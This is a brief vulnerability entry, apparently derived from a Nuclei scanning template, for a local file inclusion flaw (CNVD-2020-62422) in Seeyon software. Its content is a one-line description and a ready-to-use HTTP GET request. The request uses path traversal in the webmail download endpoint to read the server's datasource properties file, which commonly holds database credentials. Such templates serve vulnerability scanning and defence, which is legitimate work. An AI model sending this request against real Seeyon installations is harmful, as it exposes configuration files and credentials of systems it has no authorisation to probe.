# Vulnerability: Seeyon - Local File Inclusion
**Classification:** CNVD
**Source:** Nuclei Template (`CNVD-2020-62422.yaml`)

## Description
Seeyon is vulnerable to local file inclusion.

```http
GET {{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
```
